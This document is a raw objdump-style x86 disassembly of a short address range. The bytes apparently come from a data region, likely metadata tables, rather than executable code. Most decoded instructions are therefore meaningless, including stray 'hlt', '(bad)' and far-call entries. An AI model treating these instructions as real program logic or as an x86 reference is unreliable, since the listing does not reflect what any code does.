  40638d:	05 58 00 11 00       	add    $0x110058,%eax
  406392:	5c                   	pop    %esp
  406393:	30 00                	xor    %al,(%eax)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 9b 15 9a    	add    %dl,-0x65ea6500(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 47 07 9a    	add    %dl,-0x65f8b900(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 91 1d 0a    	add    %dl,0xa1d9118(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 2a                	add    %ch,(%edx)
  4063c5:	17                   	pop    %ss
  4063c6:	0a 00                	or     (%eax),%al
  4063c8:	14 00                	adc    $0x0,%al
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	8b 1d 0e 00 14 00    	mov    0x14000e,%ebx
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 5a 03 0a    	add    %dl,0xa035a00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 04 02 1d    	add    %dl,0x1d020400(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 65 24 1d    	add    %dl,0x1d246500(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 13 0b 1d    	add    %dl,0x1d0b1300(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 f8                	add    %bh,%al
  406419:	05 1d 00 14 00       	add    $0x14001d,%eax
  40641e:	20 36                	and    %dh,(%esi)
  406420:	00 00                	add    %al,(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 66 09             	add    %ah,0x9(%esi)
  406428:	1d 00 14 00 78       	sbb    $0x78001400,%eax
  40642d:	20 00                	and    %al,(%eax)
  40642f:	00 00                	add    %al,(%eax)
  406431:	00 86 18 8b 1d 0e    	add    %al,0xe1d8b18(%esi)
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 c6                	add    %al,%dh
  406443:	1a c3                	sbb    %bl,%al
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 70 05             	add    %dh,0x5(%eax)
  406452:	c7 00 14 00 5c 37    	movl   $0x375c0014,(%eax)
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 7f 15             	add    %bh,0x15(%edi)
  406460:	53                   	push   %ebx
  406461:	00 15 00 7b 21 00    	add    %dl,0x217b00
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 1b 07 1d    	add    %dl,0x1d071b00(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 13 01 0a    	add    %dl,0xa011300(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 65 06 c3    	add    %dl,-0x3cf99b00(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 b3 26 d5    	add    %dl,-0x2ad94d00(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 f1 03 0a    	add    %dl,0xa03f100(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 e1 12 c3    	add    %dl,-0x3ced1f00(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 8c 02 1d    	add    %dl,0x1d028c00(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 e5 06 0a    	add    %dl,0xa06e500(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 fc    	add    %al,-0x3df6a00(%eax)
  4064dd:	23 e0                	and    %eax,%esp
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 0f    	add    %al,0xf209600(%eax)
  4064eb:	07                   	pop    %es
  4064ec:	e4 00                	in     $0x0,%al
  4064ee:	16                   	push   %ss
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 59    	add    %al,0x59209600(%eax)
  4064f9:	24 ec                	and    $0xec,%al
  4064fb:	00 19                	add    %bl,(%ecx)
  4064fd:	00 00                	add    %al,(%eax)
  4064ff:	00 00                	add    %al,(%eax)
  406501:	00 80 00 96 20 33    	add    %al,0x33209600(%eax)
  406507:	0f f1 00             	psllw  (%eax),%mm0
  40650a:	1a 00                	sbb    (%eax),%al
  40650c:	00 00                	add    %al,(%eax)
  40650e:	00 00                	add    %al,(%eax)
  406510:	80 00 96             	addb   $0x96,(%eax)
  406513:	20 3b                	and    %bh,(%ebx)
  406515:	24 f8                	and    $0xf8,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 4d 04             	and    %cl,0x4(%ebp)
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 68 03 1c    	add    %dl,0x1c036800(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 5d 14 0a    	add    %dl,0xa145d00(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 06                	add    %al,(%esi)
  40654d:	05 0a 00 22 00       	add    $0x22000a,%eax
  406552:	f4                   	hlt
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 e4 1d 23    	add    %dl,0x231de400(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 8d 15 2a 01 24    	add    %cl,0x24012a15(%ebp)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 c6 19 84    	add    %dl,-0x7be63a00(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 e4 20 1d    	add    %dl,0x1d20e400(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 91 1d 0a    	add    %dl,0xa1d9118(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 15 24 9a    	add    %dl,-0x65dbeb00(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 e6                	add    %ah,%dh
  4065af:	09 38                	or     %edi,(%eax)
  4065b1:	01 27                	add    %esp,(%edi)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 2c 15 0a    	add    %dl,0xa152c00(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 1f 25 3e    	add    %dl,0x3e251f00(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 91 1d 0a 00 29    	sbb    %dl,0x29000a1d(%ecx)
  4065dd:	00 f4                	add    %dh,%ah
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	8b 1d 6b 01 29 00    	mov    0x29016b,%ebx
  4065ec:	56                   	push   %esi
  4065ed:	22 00                	and    (%eax),%al
  4065ef:	00 00                	add    %al,(%eax)
  4065f1:	00 86 00 63 18 70    	add    %al,0x70186300(%esi)
  4065f7:	01 2a                	add    %ebp,(%edx)
  4065f9:	00 6c 41 00          	add    %ch,0x0(%ecx,%eax,2)
  4065fd:	00 00                	add    %al,(%eax)
  4065ff:	00 86 00 8f 09 75    	add    %al,0x75098f00(%esi)
  406605:	01 2b                	add    %ebp,(%ebx)
  406607:	00 6e 22             	add    %ch,0x22(%esi)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	86 00                	xchg   %al,(%eax)
  406610:	42                   	inc    %edx
  406611:	09 70 01             	or     %esi,0x1(%eax)
  406614:	2c 00                	sub    $0x0,%al
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 74 09 75    	add    %al,0x75097400(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 03 0a 7c 01    	addl   $0x17c0a03,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 91 1d 0a    	add    %dl,0xa1d9118(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 1e                	add    %bl,(%esi)
  406649:	1e                   	push   %ds
  40664a:	c7 00 30 00 40 45    	movl   $0x45400030,(%eax)
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 ac 12 84 01 31 00 	add    %ch,0x310184(%edx,%edx,1)
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 bf 26 2a    	add    %dl,0x2a26bf00(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 b3 0a 93 01 33    	add    %dh,0x3301930a(%ebx)
  406677:	00 80 45 00 00 00    	add    %al,0x45(%eax)
  40667d:	00 96 00 69 14 93    	add    %dl,-0x6ceb9700(%esi)
  406683:	01 34 00             	add    %esi,(%eax,%eax,1)
  406686:	c8 45 00 00          	enter  $0x45,$0x0
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 51 16             	add    %dl,0x16(%ecx)
  406690:	93                   	xchg   %eax,%ebx
  406691:	01 35 00 10 46 00    	add    %esi,0x461000
  406697:	00 00                	add    %al,(%eax)
  406699:	00 96 00 55 1b 84    	add    %dl,-0x7be4ab00(%esi)
  40669f:	01 36                	add    %esi,(%esi)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 9d 09 99    	add    %dl,-0x66f66300(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 af 08 9f    	add    %dl,-0x60f75100(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 4e 14 a5    	add    %dl,-0x5aebb200(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 37 16 ab    	add    %dl,-0x54e9c900(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	8b 1d 0e 00 3b 00    	mov    0x3b000e,%ebx
  4066e8:	0b 23                	or     (%ebx),%esp
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	00 00                	add    %al,(%eax)
  4066ee:	91                   	xchg   %eax,%ecx
  4066ef:	18 91 1d 0a 00 3b    	sbb    %dl,0x3b000a1d(%ecx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 8b 1d b1    	add    %al,-0x4ee274e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 77 22             	or     %esi,0x22(%edi)
  40670e:	bb 01 3c 00 40       	mov    $0x40003c01,%ebx
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 6a 23             	add    %ebp,0x23(%edx)
  40671c:	bf 01 3c 00 63       	mov    $0x63003c01,%edi
  406721:	23 00                	and    (%eax),%eax
  406723:	00 00                	add    %al,(%eax)
  406725:	00 e1                	add    %ah,%cl
  406727:	01 8f 21 0e 00 3c    	add    %ecx,0x3c000e21(%edi)
  40672d:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 8b 1d cb    	add    %al,-0x34e274e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 cf 0a d7    	add    %al,-0x28f53100(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 8c 07 dc    	add    %al,-0x23f87400(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 d9 20 e2    	add    %al,-0x1ddf2700(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 31 06 e8    	add    %al,-0x17f9cf00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 8c 17 ee    	add    %al,-0x11e873f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	b2 14                	mov    $0x14,%dl
  40678c:	f4                   	hlt
  40678d:	01 42 00             	add    %eax,0x0(%edx)
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 b4 06 6b 01    	addl   $0x16b06b4,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 32 0a 0e 00    	addl   $0xe0a32,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 4c 03 d7 01    	addl   $0x1d7034c,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 07 03 0a 02    	addl   $0x20a0307,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	e5 08                	in     $0x8,%eax
  4067d2:	dc 01                	faddl  (%ecx)
  4067d4:	44                   	inc    %esp
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 d3 14 d7    	add    %al,-0x28eb2d00(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 f3 1d d7    	add    %al,-0x28e20d00(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 be 08 d7    	add    %al,-0x28f74200(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 15 06 0f 02    	addl   $0x20f0615,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 55 18 0f 02    	addl   $0x20f1855,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	09 15 15 02 47 00    	or     %edx,0x470215
  40682a:	5f                   	pop    %edi
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 41 14 1a    	add    %al,0x1a144100(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 88 0d 1f    	add    %al,0x1f0d8800(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	59                   	pop    %ecx
  40684f:	08 23                	or     %ah,(%ebx)
  406851:	02 49 00             	add    0x0(%ecx),%cl
  406854:	28 4a 00             	sub    %cl,0x0(%edx)
  406857:	00 00                	add    %al,(%eax)
  406859:	00 86 00 83 04 27    	add    %al,0x27048300(%esi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	32 0b                	xor    (%ebx),%cl
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	92                   	xchg   %eax,%edx
  406879:	08 31                	or     %dh,(%ecx)
  40687b:	02 4a 00             	add    0x0(%edx),%cl
  40687e:	85 24 00             	test   %esp,(%eax,%eax,1)
  406881:	00 00                	add    %al,(%eax)
  406883:	00 86 00 c5 09 36    	add    %al,0x3609c500(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 d6                	add    %dl,%dh
  406895:	06                   	push   %es
  406896:	3c 02                	cmp    $0x2,%al
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 78 03 42    	add    %al,0x42037800(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 e6 00 42    	add    %al,0x4200e600(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	98                   	cwtl
  4068bf:	07                   	pop    %es
  4068c0:	dc 01                	faddl  (%ecx)
  4068c2:	50                   	push   %eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 2f 24 0e    	add    %al,0xe242f00(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 65 08 6b    	add    %al,0x6b086500(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 7e 17 47    	add    %al,0x47177e00(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 38 25 4b    	add    %al,0x4b253800(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	5f                   	pop    %edi
  406905:	23 50 02             	and    0x2(%eax),%edx
  406908:	53                   	push   %ebx
  406909:	00 1f                	add    %bl,(%edi)
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	30 18                	xor    %bl,(%eax)
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	ea 05 2b 02 55 00 24 	ljmp   $0x2400,$0x55022b05
  406927:	4d                   	dec    %ebp
  406928:	00 00                	add    %al,(%eax)
  40692a:	00 00                	add    %al,(%eax)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	70 06                	jo     0x406936
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	02 25 0f 02 57 00    	add    0x57020f,%ah
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	85 12                	test   %edx,(%edx)
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	b2 15                	mov    $0x15,%dl
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	b5 13                	mov    $0x13,%ch
  406968:	47                   	inc    %edi
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	c2 13 6b             	ret    $0x6b13
  406977:	01 59 00             	add    %ebx,0x0(%ecx)
  40697a:	45                   	inc    %ebp
  40697b:	25 00 00 00 00       	and    $0x0,%eax
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	80 1c 23 02          	sbbb   $0x2,(%ebx,%eiz,1)
  406986:	5a                   	pop    %edx
  406987:	00 4d 25             	add    %cl,0x25(%ebp)
  40698a:	00 00                	add    %al,(%eax)
  40698c:	00 00                	add    %al,(%eax)
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	8e 1c 15 02 5a 00 56 	mov    0x56005a02(,%edx,1),%ds
  406997:	25 00 00 00 00       	and    $0x0,%eax
  40699c:	86 08                	xchg   %cl,(%eax)
  40699e:	29 21                	sub    %esp,(%ecx)
  4069a0:	27                   	daa
  4069a1:	02 5b 00             	add    0x0(%ebx),%bl
  4069a4:	5e                   	pop    %esi
  4069a5:	25 00 00 00 00       	and    $0x0,%eax
  4069aa:	86 08                	xchg   %cl,(%eax)
  4069ac:	35 21 55 02 5b       	xor    $0x5b025521,%eax
  4069b1:	00 c0                	add    %al,%al
  4069b3:	54                   	push   %esp
  4069b4:	00 00                	add    %al,(%eax)
  4069b6:	00 00                	add    %al,(%eax)
  4069b8:	86 08                	xchg   %cl,(%eax)
  4069ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4069bb:	25 5a 02 5c 00       	and    $0x5c025a,%eax
  4069c0:	67 25 00 00 00 00    	addr16 and $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	62 0f                	bound  %ecx,(%edi)
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	54                   	push   %esp
  4069d7:	1d 64 02 5c 00       	sbb    $0x5c0264,%eax
  4069dc:	7c 25                	jl     0x406a03
  4069de:	00 00                	add    %al,(%eax)
  4069e0:	00 00                	add    %al,(%eax)
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	8b 1d 0e 00 5c 00    	mov    0x5c000e,%ebx
  4069ea:	20 55 00             	and    %dl,0x0(%ebp)
  4069ed:	00 00                	add    %al,(%eax)
  4069ef:	00 96 00 c9 00 b1    	add    %dl,-0x4eff3700(%esi)
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 21                	add    %ah,(%ecx)
  406a01:	24 b8                	and    $0xb8,%al
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
